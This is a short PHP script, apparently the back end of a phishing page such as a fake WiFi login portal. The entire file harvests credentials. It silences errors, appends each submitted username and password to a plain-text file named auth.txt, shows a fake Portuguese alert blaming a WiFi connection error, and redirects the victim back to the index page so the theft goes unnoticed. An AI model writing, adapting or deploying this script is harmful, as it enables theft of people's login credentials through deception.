<?php 
error_reporting(0);

$user=$_POST['username'];
$pass=$_POST['password'];

$f_data=$user . " - " . $pass;

$file = fopen("auth.txt", "a");
fwrite($file, $f_data);
fwrite($file,"\n");
fclose($file);

echo "<script>alert(\"Erro inesperado na sua ligação WiFi. Tente mais tarde.\");</script>";

echo"<meta http-equiv=\"refresh\" content=\"0; URL=\index.html\">";

?>